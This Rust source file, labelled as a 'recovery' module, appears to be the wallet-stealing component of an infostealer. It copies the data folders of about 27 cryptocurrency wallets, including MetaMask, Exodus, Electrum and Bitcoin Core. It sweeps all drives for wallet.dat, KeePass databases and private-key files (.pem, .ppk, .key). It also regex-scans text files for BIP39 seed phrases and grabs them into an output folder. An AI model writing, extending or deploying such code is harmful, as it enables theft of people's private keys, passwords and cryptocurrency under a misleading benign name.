use crate::recovery::{
    context::RecoveryContext,
    fs::{copy_dir_limited, copy_file, sanitize_label},
    output::write_json_artifact,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use regex::Regex;
use serde::Serialize;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use walkdir::WalkDir;

pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(CryptoWalletTask::new(ctx)),
        Arc::new(WalletPatternSearchTask::new(ctx)),
        Arc::new(SeedPhraseDiscoveryTask::new(ctx)),
        wallet_inventory_task(ctx),
    ]
}

pub fn wallet_inventory_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(WalletInventoryTask::new(ctx))
}

pub struct WalletInventoryTask {
    specs: Vec<WalletSummarySpec>,
}

struct WalletSummarySpec {
    label: &'static str,
    sources: Vec<PathBuf>,
    sample_limit: usize,
}

impl WalletInventoryTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        let specs = wallet_specs(ctx)
            .into_iter()
            .map(|(label, sources, _, _)| WalletSummarySpec {
                label,
                sources,
                sample_limit: 64,
            })
            .collect();
        Self { specs }
    }
}

#[derive(Serialize)]
struct WalletInventorySummary {
    inventories: Vec<WalletInventoryRecord>,
}

#[derive(Serialize)]
struct WalletInventoryRecord {
    label: String,
    roots: Vec<String>,
    exists: bool,
    file_count: usize,
    total_bytes: u64,
    samples: Vec<WalletFile>,
}

#[derive(Serialize)]
struct WalletFile {
    relative: String,
    size: u64,
}

async fn collect_wallet_files(
    root: &Path,
    limit: usize,
) -> Result<(Vec<WalletFile>, usize, u64), RecoveryError> {
    let mut stack = vec![root.to_path_buf()];
    let mut samples = Vec::new();
    let mut count = 0;
    let mut total_bytes = 0;

    while let Some(path) = stack.pop() {
        let mut dir = match fs::read_dir(&path).await {
            Ok(dir) => dir,
            Err(err) => return Err(RecoveryError::Io(err)),
        };

        while let Some(entry) = dir.next_entry().await? {
            let metadata = entry.metadata().await?;
            if metadata.is_dir() {
                stack.push(entry.path());
            } else if metadata.is_file() {
                count += 1;
                total_bytes += metadata.len();
                if samples.len() < limit {
                    let relative = entry
                        .path()
                        .strip_prefix(root)
                        .map(|p| p.display().to_string())
                        .unwrap_or_else(|_| entry.path().display().to_string());
                    samples.push(WalletFile {
                        relative,
                        size: metadata.len(),
                    });
                }
            }
        }
    }

    Ok((samples, count, total_bytes))
}

#[async_trait]
impl RecoveryTask for WalletInventoryTask {
    fn label(&self) -> String {
        "Wallet Inventory".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut inventories = Vec::new();

        for spec in &self.specs {
            let mut record = WalletInventoryRecord {
                label: spec.label.to_string(),
                roots: spec
                    .sources
                    .iter()
                    .map(|path| path.display().to_string())
                    .collect(),
                exists: false,
                file_count: 0,
                total_bytes: 0,
                samples: Vec::new(),
            };

            for root in &spec.sources {
                if !root.exists() {
                    continue;
                }

                record.exists = true;
                if let Ok((samples, count, bytes)) =
                    collect_wallet_files(root, spec.sample_limit).await
                {
                    record.samples.extend(samples);
                    record.file_count += count;
                    record.total_bytes += bytes;
                }
            }

            inventories.push(record);
        }

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "wallet-inventory.json",
            &WalletInventorySummary { inventories },
        )
        .await?;

        Ok(vec![artifact])
    }
}

struct CryptoWalletTask {
    specs: Vec<WalletSpec>,
}

impl CryptoWalletTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: build_wallet_specs(ctx),
        }
    }
}

#[async_trait]
impl RecoveryTask for CryptoWalletTask {
    fn label(&self) -> String {
        "Crypto Wallet Data".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        for spec in &self.specs {
            let dest_root = wallet_output_dir(ctx, spec.label).await?;
            for dir in &spec.directories {
                if fs::metadata(dir).await.is_ok() {
                    copy_dir_limited(dir, &dest_root, &spec.label, &mut artifacts, usize::MAX, 0)
                        .await?;
                }
            }
            for file in &spec.files {
                copy_file(&spec.label, file, &dest_root, &mut artifacts).await?;
            }
        }

        Ok(artifacts)
    }
}

struct WalletSpec {
    label: &'static str,
    directories: Vec<PathBuf>,
    files: Vec<PathBuf>,
}

impl WalletSpec {
    fn new(label: &'static str) -> Self {
        Self {
            label,
            directories: Vec::new(),
            files: Vec::new(),
        }
    }
}

pub fn wallet_specs(
    ctx: &RecoveryContext,
) -> Vec<(&'static str, Vec<PathBuf>, Vec<PathBuf>, &'static str)> {
    let roaming = &ctx.roaming_data_dir;
    let local = &ctx.local_data_dir;
    let home = &ctx.home_dir;

    vec![
        (
            "Ethereum Keystore",
            vec![roaming.join("Ethereum").join("keystore")],
            vec![],
            "Ethereum",
        ),
        (
            "Electrum Wallets",
            vec![roaming.join("Electrum").join("wallets")],
            vec![],
            "Electrum",
        ),
        (
            "Atomic LevelDB",
            vec![roaming.join("atomic").join("Local Storage").join("leveldb")],
            vec![],
            "Atomic",
        ),
        (
            "Exodus",
            vec![],
            vec![roaming.join("Exodus").join("exodus.wallet")],
            "Exodus",
        ),
        (
            "Jaxx LevelDB",
            vec![
                roaming
                    .join("com.liberty.jaxx")
                    .join("IndexedDB")
                    .join("file__0.indexeddb.leveldb"),
            ],
            vec![],
            "Jaxx",
        ),
        (
            "Coinomi",
            vec![roaming.join("Coinomi").join("Coinomi").join("wallets")],
            vec![],
            "Coinomi",
        ),
        (
            "Guarda LevelDB",
            vec![roaming.join("Guarda").join("Local Storage").join("leveldb")],
            vec![],
            "Guarda",
        ),
        (
            "Zephyr",
            vec![roaming.join("Zephyr").join("wallets")],
            vec![],
            "Zephyr",
        ),
        ("Armory", vec![roaming.join("Armory")], vec![], "Armory"),
        (
            "Bytecoin",
            vec![roaming.join("bytecoin")],
            vec![],
            "Bytecoin",
        ),
        ("Zcash", vec![roaming.join("Zcash")], vec![], "Zcash"),
        ("DashCore", vec![roaming.join("DashCore")], vec![], "Dash"),
        (
            "Monero",
            vec![home.join("Documents").join("Monero").join("wallets")],
            vec![],
            "Monero",
        ),
        (
            "Bitcoin Core",
            vec![roaming.join("Bitcoin")],
            vec![],
            "Bitcoin",
        ),
        (
            "Litecoin Core",
            vec![roaming.join("Litecoin")],
            vec![],
            "Litecoin",
        ),
        (
            "Dogecoin Core",
            vec![roaming.join("Dogecoin")],
            vec![],
            "Dogecoin",
        ),
        ("Raven Core", vec![roaming.join("Raven")], vec![], "Raven"),
        (
            "MultiBit HD",
            vec![roaming.join("MultiBitHD")],
            vec![],
            "MultiBit",
        ),
        (
            "Wasabi Wallet",
            vec![roaming.join("WalletWasabi").join("Client").join("Wallets")],
            vec![],
            "Wasabi",
        ),
        (
            "Daedalus Wallet",
            vec![roaming.join("Daedalus Mainnet").join("wallets")],
            vec![],
            "Daedalus",
        ),
        ("Yoroi", vec![roaming.join("Yoroi")], vec![], "Yoroi"),
        (
            "Terra Station",
            vec![roaming.join("Terra Station")],
            vec![],
            "Terra",
        ),
        (
            "Sparrow Wallet",
            vec![roaming.join("Sparrow").join("wallets")],
            vec![],
            "Sparrow",
        ),
        ("Binance", vec![roaming.join("Binance")], vec![], "Binance"),
        (
            "MetaMask Desktop",
            vec![local.join("MetaMask").join("Local Storage").join("leveldb")],
            vec![],
            "MetaMask",
        ),
        (
            "Ronin Desktop",
            vec![local.join("Ronin").join("Local Storage").join("leveldb")],
            vec![],
            "Ronin",
        ),
        (
            "Phantom Desktop",
            vec![local.join("Phantom").join("Local Storage").join("leveldb")],
            vec![],
            "Phantom",
        ),
    ]
}

fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
    wallet_specs(ctx)
        .into_iter()
        .map(|(label, dirs, files, _)| {
            let mut spec = WalletSpec::new(label);
            spec.directories = dirs;
            spec.files = files;
            spec
        })
        .collect()
}

struct WalletPatternSearchTask {
    user_roots: Vec<PathBuf>,
    drive_roots: Vec<PathBuf>,
}

impl WalletPatternSearchTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let mut user_roots = vec![
            ctx.home_dir.join("Desktop"),
            ctx.home_dir.join("Documents"),
            ctx.home_dir.join("Downloads"),
            ctx.local_data_dir.clone(),
            ctx.roaming_data_dir.clone(),
        ];
        user_roots.retain(|p| p.exists());

        let mut drive_roots = Vec::new();
        for b in b'D'..=b'Z' {
            let drive = format!("{}:\\", b as char);
            let path = PathBuf::from(&drive);
            if path.exists() {
                drive_roots.push(path);
            }
        }

        Self {
            user_roots,
            drive_roots,
        }
    }
}

const TARGET_PATTERNS: &[&str] = &[
    "wallet.dat",
    "default_wallet",
    "UTC--",
    ".kdbx",
    ".key",
    ".pem",
    ".ppk",
];

const IGNORED_DIRS: &[&str] = &[
    "Windows",
    "Program Files",
    "Program Files (x86)",
    "ProgramData",
    "$Recycle.Bin",
    "System Volume Information",
    "OneDriveTemp",
    "node_modules",
    ".git",
    "target",
];

#[async_trait]
impl RecoveryTask for WalletPatternSearchTask {
    fn label(&self) -> String {
        "Wallet Discovery".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest_root = wallet_output_dir(ctx, "Discovery").await?;
        let mut handles = Vec::new();

        for root in &self.user_roots {
            let root = root.clone();
            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 5)));
        }

        for root in &self.drive_roots {
            let root = root.clone();
            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 3)));
        }

        for handle in handles {
            if let Ok(files) = handle.await {
                for file in files {
                    let _ = copy_file("Discovery", &file, &dest_root, &mut artifacts).await;
                }
            }
        }

        Ok(artifacts)
    }
}

fn perform_scan(root: PathBuf, depth: usize) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let walker = WalkDir::new(root)
        .max_depth(depth)
        .follow_links(false)
        .into_iter()
        .filter_entry(|e| !is_ignored(e));

    for entry in walker.filter_map(Result::ok) {
        if !entry.file_type().is_file() {
            continue;
        }
        let name = entry.file_name().to_string_lossy();
        if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
            found.push(entry.path().to_path_buf());
        }
    }
    found
}

fn is_ignored(entry: &walkdir::DirEntry) -> bool {
    entry
        .file_name()
        .to_str()
        .map(|s| IGNORED_DIRS.contains(&s))
        .unwrap_or(false)
}

struct SeedPhraseDiscoveryTask {
    roots: Vec<PathBuf>,
}

impl SeedPhraseDiscoveryTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let mut roots = vec![
            ctx.home_dir.join("Desktop"),
            ctx.home_dir.join("Documents"),
            ctx.home_dir.join("Downloads"),
        ];
        roots.retain(|p| p.exists());
        Self { roots }
    }
}

#[async_trait]
impl RecoveryTask for SeedPhraseDiscoveryTask {
    fn label(&self) -> String {
        "Seed Phrase Discovery".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest_root = wallet_output_dir(ctx, "Seeds").await?;

        let bip39_regex = Regex::new(r"(?i)\b([a-z]{3,}\s+){11,23}[a-z]{3,}\b").unwrap();
        let seed_names = ["seed", "mnemonic", "phrase", "backup", "crypto", "wallet"];

        for root in &self.roots {
            let walker = WalkDir::new(root)
                .max_depth(3)
                .follow_links(false)
                .into_iter()
                .filter_entry(|e| !is_ignored(e));

            for entry in walker.filter_map(Result::ok) {
                if !entry.file_type().is_file() {
                    continue;
                }

                let path = entry.path();
                let name = path
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .to_lowercase();

                let mut should_grab = false;

                if name.ends_with(".txt")
                    || name.ends_with(".doc")
                    || name.ends_with(".docx")
                    || name.ends_with(".pdf")
                {
                    if seed_names.iter().any(|&s| name.contains(s)) {
                        should_grab = true;
                    }
                }

                if !should_grab && name.ends_with(".txt") {
                    if let Ok(meta) = fs::metadata(path).await {
                        if meta.len() < 1024 * 10 {
                            if let Ok(content) = fs::read_to_string(path).await {
                                if bip39_regex.is_match(&content) {
                                    should_grab = true;
                                }
                            }
                        }
                    }
                }

                if should_grab {
                    let _ = copy_file("Seeds", path, &dest_root, &mut artifacts).await;
                }
            }
        }

        Ok(artifacts)
    }
}

async fn wallet_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Wallets")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}
